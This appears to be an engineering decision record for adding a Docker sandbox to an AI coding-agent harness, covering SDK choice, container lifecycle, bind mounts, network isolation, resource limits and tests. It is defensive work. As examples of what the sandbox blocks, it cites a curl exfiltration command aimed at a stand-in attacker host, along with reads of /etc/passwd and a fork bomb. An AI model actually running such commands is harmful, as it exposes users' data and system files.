# Phase 7b Boundary — `SandboxExecution` (Docker Substrate)

> Status: locked at Phase 7b entry, 2026-05-16.
>
> Scope note:**this boundary covers the Docker substrate
> implementation**. The abstraction layer(`ExecutionEnvironment`
> Protocol + ``HostExecution``)was landed in Phase 7a — see
> [`decisions/15-phase-7-boundary.md`](./15-phase-7-boundary.md).
> Phase 7b is pure plug-in work:add a second ``ExecutionEnvironment``
> implementation, wire it into Settings + CLI.
>
> Rationale + framing:Phase 7a retro `learnings/phase-7a.md` §3.6
> identified that abstraction-first was the right call, and 7b is now
> purely engineering. Three-Axis 2026-05-16 in chat re-evaluated the
> S1-S8 tentatives from `tasks/phase-7-preview.md`(then targeted at
> the unified Phase 7)and locked the two genuinely open questions:
> Docker SDK choice + image strategy.

## Triggering observation

Phase 7a established the abstraction. ``HostExecution`` proved that
``BashTool.execute`` delegates to ``ctx.execution_env.run_command(...)``
without any other layer caring. Phase 7b's job is to provide a
**second** ``ExecutionEnvironment`` implementation — one that actually
sandboxes via Linux kernel namespaces (Docker) — and prove the
``--sandbox`` flag really does swap substrates with zero LLM-visible
behavior change beyond the safety properties (no host fs access
outside cwd / no network by default / cgroup-bounded resources).

The cross-cutting invariant Phase 7a verified holds without further
work:permissions / hooks / engine / observability / mcp / compaction /
skills / commands / protocols continue to be untouched. Phase 7b only
adds:

- `execution/sandbox.py` — `SandboxExecution(ExecutionEnvironment)`
- `pyproject.toml` — `aiodocker` dependency
- `config/settings.py` — `sandbox_*` fields
- `cli.py` — `--sandbox` / `--sandbox-network` / `--sandbox-memory` /
  `--sandbox-image` flags; bootstrap chain swaps in
  `SandboxExecution` when flag is set

That's the entire surface. No new Protocol method, no engine
re-architecture, no test infrastructure overhaul. **The
abstraction-first pattern's payoff: pure additive substrate plug-in.**

---

## In scope

**D18.1 — Docker via `aiodocker` async SDK.**

```python
import aiodocker

class SandboxExecution:
    async def run_command(self, command, cwd, timeout=None) -> ProcessResult:
        # Reuses self._container (spawned at __aenter__), execs into it
        exec_obj = await self._container.exec(["sh", "-c", command], ...)
        ...
```

Reasoning(per Three-Axis 2026-05-16):

- `aiodocker` is async-native — matches existing `await env.run_command()`
  semantics without `asyncio.to_thread` wrapping
- Lightweight (~200 LoC SDK code); single dependency
- Actively maintained; Docker Engine API 1.41+ supported
- Rejected:`docker` Python SDK (sync-only,wrap-in-thread overhead),
  CLI shell-out (~30% more code for JSON parsing + subprocess
  management)

**D18.2 — Per-query lifecycle.**

`SandboxExecution` is an async context manager (`__aenter__` /
`__aexit__`). One container per `oh ask` invocation:

```python
async with SandboxExecution(...) as env:
    # Container spawned; ready for execs
    context = QueryContext(..., execution_env=env)
    async for event in run_query(...):
        ...
# Container stopped + removed
```

Same shape as Phase 5a `McpClientPool` (per-query lifecycle for MCP
servers). CLI's `_run_ask` enters/exits the context.

Reasoning:

- Per-tool-call lifecycle would mean 100ms-1s overhead per Bash call
  (container spawn time); interactive UX would suffer
- Per-session lifecycle (across multiple `oh ask` invocations) would
  need a daemon to track stale containers and adds state pollution
  risk; defer

**D18.3 — Path translation: LLM sees host paths; substrate translates.**

LLM consumes / emits host paths (`/Users/me/proj/foo.txt`). At
dispatch time, ``SandboxExecution.run_command`` receives
``cwd=context.cwd`` as a host ``Path``. Internally, the substrate
**rewrites cwd to the container's mountpoint** (`/workspace` — the
bind mount target):

```python
# Inside SandboxExecution.run_command:
# cwd is host path /Users/me/proj
# Container sees this as /workspace (per the bind mount)
container_cwd = "/workspace"  # the substrate constant
```

If LLM emits a host-style absolute path inside `command` (e.g.,
``"cat /Users/me/proj/foo.txt"``), it WILL fail inside the container
— the path doesn't exist in the container's namespace. That's a
defense feature: the LLM can't accidentally reach outside `/workspace`
even if it tries. Cwd-relative paths and `/workspace`-prefixed
absolutes both work.

Reasoning:

- User-facing abstraction stability — LLM context never mentions
  `/workspace`; the harness internally translates
- Same pattern as Phase 5a MCP namespacing (`Server.Tool` is the
  LLM-facing form, internally just one of N tools)

**D18.4 — Bind mount: cwd RW only; nothing else.**

```python
HostConfig(
    Binds=[f"{cwd}:/workspace:rw"],
    WorkingDir="/workspace",
    ...
)
```

The container's filesystem view contains ONLY:
- The base image's root (read-only by default in our setup)
- `/workspace` bind-mounted from host cwd, read-write

No `/etc/passwd`, no `~/.ssh`, no `/Users/me/.aws`. They are
**structurally not present** in the container's mount namespace —
defense in depth via kernel, not via permission checks.

**D18.5 — Network: default `none`, opt-in `--sandbox-network=bridge`.**

```python
HostConfig(NetworkMode="none")  # default
# or
HostConfig(NetworkMode="bridge")  # --sandbox-network=bridge
```

`none` means the container has no network interfaces beyond loopback
— `curl https://attacker.example/exfil` fails at the IP layer.
`bridge` is Docker's default network with NAT'd internet access; users
opt in when they legitimately need it (npm install, git clone, etc.).

The `--sandbox-network=host` option is **rejected**:would defeat
the whole point of network isolation. Users wanting host networking
can use `--no-sandbox`.

**D18.6 — Resource limits.**

```python
HostConfig(
    Memory=1024 * 1024 * 1024,  # 1 GB
    CpuQuota=100_000,            # 1 CPU equivalent (default 100ms / 100ms period)
    PidsLimit=256,
)
# Plus per-command timeout (D17.1 already provides this via ProcessResult.timed_out)
```

Defaults per S7 (preview tentative confirmed by Three-Axis):

| Resource | Default | env var |
|---|---|---|
| Memory | 1 GB | `OPENHARNESS_SANDBOX_MEMORY` (Docker-style: "512m" / "2g" / etc.) |
| CPU quota | 1 CPU | `OPENHARNESS_SANDBOX_CPUS` (float: "0.5" / "2" / etc.) |
| pid limit | 256 | `OPENHARNESS_SANDBOX_PIDS` |
| Per-Bash timeout | inherited from `BashInput.timeout_seconds` default (600s) | (already in P2-T3) |

Fork bombs, OOM, infinite-recursion all bounded by kernel — substrate
returns ``ProcessResult(exit_code=non-zero, timed_out=...)`` rather than
crashing the harness.

**D18.7 — Image: stock `python:3.12-slim` default, Settings overridable.**

```python
class Settings(BaseSettings):
    sandbox_image: str = Field(default="python:3.12-slim", ...)
```

Reasoning (per Three-Axis 2026-05-16):

- Stock image avoids the infrastructure burden (Dockerfile / CI build /
  Docker Hub push / version management) that shipping a custom
  `openharness/sandbox` image would entail
- `python:3.12-slim` (~120 MB) has `bash`, `sh`, `python3`, coreutils,
  apt — covers the vast majority of coding workflows
- Users can swap via `OPENHARNESS_SANDBOX_IMAGE=ubuntu:latest` etc.
- First-use auto-pull: `aiodocker` handles this (substrate calls
  `images.pull(image)` if not present locally)
- Phase 8+ may revisit if a real use case justifies the custom image
  infrastructure

**D18.8 — Test strategy: unit (mocked) + integration (gated).**

Two test surfaces, same pattern as Phase 1 / Phase 5 MCP integration tests:

- **Unit tests** (`tests/execution/test_sandbox.py`): mock `aiodocker`
  Client / Container with `unittest.mock`. Verify:
  - Spawn args (image / Binds / WorkingDir / NetworkMode / Memory / etc.)
  - Exec call args (Cmd / WorkingDir)
  - ProcessResult translation (stdout decode / exit_code / timed_out)
  - Lifecycle (__aenter__ pulls + spawns, __aexit__ stops + removes)
  - Cross-platform (no real Docker needed, runs everywhere)
- **Integration smoke** (`tests/execution/test_sandbox_integration.py`):
  marked `@pytest.mark.integration`, **skip if `docker info` fails**.
  Verifies:
  - `Bash("ls /workspace")` shows host cwd files inside container
  - `Bash("cat /etc/passwd")` fails (file not in container's
    filesystem view per the unmounted /etc)
  - `Bash("curl https://example.com")` fails with default
    `--network none`
  - `Bash("fork-bomb")` bounded by `PidsLimit` (no host harm)

---

## Cross-cutting invariant

**Phase 7b extends the invariant already verified in Phase 7a** — no
new layers touched. Specifically, `permissions/`, `hooks/`,
`observability/`, `mcp/`, `compaction/`, `skills/`, `commands/`,
`engine/query.py`, `engine/context.py`, `tools/base.py`, `tools/bash.py`
all stay **unchanged from Phase 7a close**.

Where change IS allowed:

- `execution/sandbox.py` (new file) — `SandboxExecution` class
- `execution/__init__.py` — export `SandboxExecution`
- `pyproject.toml` — `aiodocker>=0.21,<1.0` (proj dep) + `types-aiodocker`
  if available (dev dep) — fallback to ignore-untyped if no stubs
- `config/settings.py` — 4-5 new `sandbox_*` fields
- `cli.py` — 4 new Typer flags + `_run_ask` bootstrap chain

If any "no change allowed" layer needs editing, **stop and re-open
the boundary doc**. Phase 7a's invariant verification proved the
abstraction is right; Phase 7b's job is to honor that proof.

---

## Out of scope (Phase 8+)

- **gVisor / Firecracker substrates** — other `ExecutionEnvironment`
  implementations are Phase 8+ if a use case surfaces (e.g.,
  Code Interpreter-class hostile-code isolation needs gVisor)
- **Multi-tenant container reuse** — every `oh ask` spawns a fresh
  container. Pooling defers
- **Sub-command sandboxing**: only Bash routes through the substrate
  (per Phase 7a D17.4). Read/Write/Edit/Grep stay on host fs
- **Custom Dockerfile shipped with the harness** — defer until users
  actually demand specific pre-installed tooling
- **Egress allow-list** (e.g., `--sandbox-network-allow=npm.example.com`)
  — `none`/`bridge` covers ~95% of use cases; granular egress is
  Phase 8+ if enterprise demand surfaces
- **Container resource introspection / metrics** — no
  `docker stats`-style monitoring; users can use Docker tooling
  directly
- **Streaming process output** — `ProcessResult` is still a single
  `(output, exit_code, timed_out)` after completion. Same as Host

---

## Critical decisions (D18.x)

| ID | Decision | Why |
|---|---|---|
| **D18.1** | `aiodocker` async-native SDK | Matches existing async patterns; lightweight; no thread-pool wrapping overhead |
| **D18.2** | Per-query container lifecycle | Spawn time amortized; matches Phase 5 MCP Pool shape |
| **D18.3** | LLM sees host paths; substrate translates cwd → `/workspace` | User-facing abstraction stability (same as MCP namespacing) |
| **D18.4** | Bind mount cwd RW only | Minimal authorization; defense in depth via kernel namespace |
| **D18.5** | `--network none` default + `--sandbox-network=bridge` opt-in | Block exfiltration by default; explicit opt-in when needed |
| **D18.6** | 1GB / 1 CPU / 256 pid defaults | Sensible for coding workflows; fork bomb / OOM bounded by kernel |
| **D18.7** | Stock `python:3.12-slim` default; Settings overridable | Zero infrastructure; ~120MB image covers most cases |
| **D18.8** | Unit (mocked aiodocker) + integration (gated on `docker info`) | Same gating pattern as Phase 1 / Phase 5 integration tests |

---

## Dependency direction

```
execution/sandbox.py              (new)
   ├── imports aiodocker
   └── implements ExecutionEnvironment (per D17.1)

execution/__init__.py             ← +1 export

config/settings.py                ← +4 fields (sandbox_image/network/memory/cpus/pids)
cli.py                            ← +4 flags + bootstrap swap

permissions/                      ← ZERO CHANGE (per invariant)
hooks/                            ← ZERO CHANGE
engine/                           ← ZERO CHANGE
observability/                    ← ZERO CHANGE
tools/                            ← ZERO CHANGE
mcp/                              ← ZERO CHANGE
compaction/                       ← ZERO CHANGE
skills/                           ← ZERO CHANGE
commands/                         ← ZERO CHANGE
protocols/                        ← ZERO CHANGE
execution/base.py                 ← ZERO CHANGE (Protocol shape stable)
execution/host.py                 ← ZERO CHANGE
```

Phase 7b is purely additive to the abstraction Phase 7a established.

---

## Acceptance for Phase 7b close-out

- [ ] `aiodocker>=0.21,<1.0` added to `pyproject.toml`
- [ ] `execution/sandbox.py` — `SandboxExecution` class implementing
  the `ExecutionEnvironment` Protocol; async context manager for
  per-query lifecycle
- [ ] Container spawn: image pull (if needed) + create with cwd
  bind mount + cgroup limits + network mode
- [ ] `run_command` execs into the running container; translates
  output → `ProcessResult`
- [ ] Settings fields: `sandbox_image`, `sandbox_network`,
  `sandbox_memory`, `sandbox_cpus`, `sandbox_pids`
- [ ] CLI flags: `--sandbox` (enable; off by default), `--sandbox-network`,
  `--sandbox-memory`, `--sandbox-cpus`, `--sandbox-image`
- [ ] `cli._run_ask` enters `SandboxExecution` context when
  `--sandbox` is set; passes it as `QueryContext.execution_env`
- [ ] Unit tests (mocked `aiodocker`) — spawn args / exec args /
  ProcessResult translation / lifecycle
- [ ] Integration test (`@pytest.mark.integration`, skipped on no
  `docker info`) — real container exercises:
  - Bash in sandbox sees /workspace files
  - Bash cannot read /etc/passwd (file doesn't exist in container view)
  - Bash cannot reach external network with `--network none`
- [ ] **Cross-cutting invariant verified by structural test**:
  no `SandboxExecution` reference in permissions / hooks /
  observability / mcp / compaction / skills / commands / engine /
  tools (except `tools/bash.py` which already routes via Protocol
  per Phase 7a)
- [ ] mypy strict + ruff clean
- [ ] README "Phase 7b — Docker sandbox" section
- [ ] `learnings/phase-7b.md` retro

---

## Pointers

- Phase 7a boundary (the abstraction this phase plugs into): [`decisions/15-phase-7-boundary.md`](./15-phase-7-boundary.md)
- Phase 7a retro (where "Phase 7b is plug-in" insight was named): [`learnings/phase-7a.md`](../learnings/phase-7a.md) §3.6
- Phase 7 preview (S1-S8 source, now folded into D18.x): [`tasks/phase-7-preview.md`](../tasks/phase-7-preview.md)
- aiodocker docs: <https://aiodocker.readthedocs.io/>
- Docker Engine API reference: <https://docs.docker.com/engine/api/>
